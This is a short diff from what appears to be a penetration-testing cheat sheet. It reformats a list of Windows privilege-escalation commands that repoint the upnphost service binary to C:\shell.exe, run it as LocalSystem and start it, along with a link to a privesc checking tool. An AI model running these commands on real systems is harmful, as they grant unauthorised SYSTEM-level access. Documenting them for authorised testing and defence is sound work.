@@ -241,19 +241,12 @@ WinPrivChk: https://github.com/pentestmonkey/windows-privesc-check
 
 Common Service Windows Privesc:
 
-sc config SSDPSRV start= “auto”
-
-net start SSDPSRV
-
-net start UPNPHOST
-
-sc config upnphost binpath= “C:\shell.exe”
-
-sc config upnphost obj= “.\LocalSystem” password= “”
-
-net start upnphost
-
-
+*sc config SSDPSRV start= “auto”*
+*net start SSDPSRV*
+*net start UPNPHOST*
+*sc config upnphost binpath= “C:\shell.exe”*
+*sc config upnphost obj= “.\LocalSystem” password= “”*
+*net start upnphost*
 
 
 
